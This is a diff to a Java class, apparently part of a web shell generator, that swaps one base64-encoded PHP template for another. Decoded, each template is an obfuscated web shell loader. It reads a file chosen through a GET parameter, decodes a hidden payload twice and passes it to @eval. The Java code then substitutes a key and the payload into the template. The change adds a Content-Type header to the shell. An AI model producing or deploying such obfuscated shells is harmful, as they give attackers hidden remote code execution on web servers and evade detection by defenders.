@@ -49,7 +49,7 @@ public class PhpEncodeDemo2 {
                 }
                 s = stringBuilder.toString();
 
-                String demo2 = "PD9waHAgLyoka2V5JCovCmhlYWRlcignU2VydmU6Jy5iYXNlNjRfZW5jb2RlKF9fRklMRV9fKSk7CiRwYXNzd29yZD0nJGJhc2U2NGNvZGUkJzsKb2Jfc3RhcnQoKTsKcmVhZGZpbGUoYmFzZTY0X2RlY29kZSgkX0dFVFsnZmlsZSddKSk7CiRmaWxlID0gb2JfZ2V0X2NvbnRlbnRzKCk7Cm9iX2VuZF9jbGVhbigpOwokdXNlcm5hbWUgPSBzdWJzdHIoJGZpbGUsOCw4KTsKJHRlbXBsYXRlX3NvdXJjZSA9IHN0cl9yZXBsYWNlKCR1c2VybmFtZSwnJywkcGFzc3dvcmQpOwokdGVtcGxhdGVfc291cmNlID0gYmFzZTY0X2RlY29kZSgkdGVtcGxhdGVfc291cmNlKTsKJHRlbXBsYXRlX3NvdXJjZSA9IGJhc2U2NF9kZWNvZGUoJHRlbXBsYXRlX3NvdXJjZSk7CiRrZXkgPSAndGVtcGxhdGVfc291cmNlJzsKJGFlc19kZWNvZGVbMV09JCRrZXk7CkBldmFsKCRhZXNfZGVjb2RlWzFdKTs=";
+                String demo2 = "PD9waHAgLyoka2V5JCovCmhlYWRlcignU2VydmU6Jy5iYXNlNjRfZW5jb2RlKF9fRklMRV9fKSk7CmhlYWRlcignQ29udGVudC1UeXBlOnRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Jyk7CiRwYXNzd29yZD0nJGJhc2U2NGNvZGUkJzsKb2Jfc3RhcnQoKTsKcmVhZGZpbGUoYmFzZTY0X2RlY29kZSgkX0dFVFsnZmlsZSddKSk7CiRmaWxlID0gb2JfZ2V0X2NvbnRlbnRzKCk7Cm9iX2VuZF9jbGVhbigpOwokdXNlcm5hbWUgPSBzdWJzdHIoJGZpbGUsOCw4KTsKJHRlbXBsYXRlX3NvdXJjZSA9IHN0cl9yZXBsYWNlKCR1c2VybmFtZSwnJywkcGFzc3dvcmQpOwokdGVtcGxhdGVfc291cmNlID0gYmFzZTY0X2RlY29kZSgkdGVtcGxhdGVfc291cmNlKTsKJHRlbXBsYXRlX3NvdXJjZSA9IGJhc2U2NF9kZWNvZGUoJHRlbXBsYXRlX3NvdXJjZSk7CiRrZXkgPSAndGVtcGxhdGVfc291cmNlJzsKJGFlc19kZWNvZGVbMV09JCRrZXk7CkBldmFsKCRhZXNfZGVjb2RlWzFdKTs=";
                 encode = new String(Base64.getDecoder().decode(demo2));
 
                 encode = encode.replace("$key$",this.key);
